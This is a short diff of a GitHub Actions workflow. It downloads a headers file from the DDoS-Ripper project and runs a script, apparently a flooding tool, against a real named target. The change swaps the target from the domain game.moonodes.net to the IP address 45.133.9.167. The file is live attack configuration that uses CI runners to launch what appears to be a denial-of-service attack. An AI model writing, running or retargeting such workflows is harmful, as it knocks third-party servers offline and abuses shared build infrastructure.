@@ -25,5 +25,5 @@ jobs:
         wget https://raw.githubusercontent.com/palahsu/DDoS-Ripper/main/headers.txt
     - name: Run mami
       run: |
-        python3 mami.py -s game.moonodes.net -t 135
+        python3 mami.py -s 45.133.9.167 -t 135
         
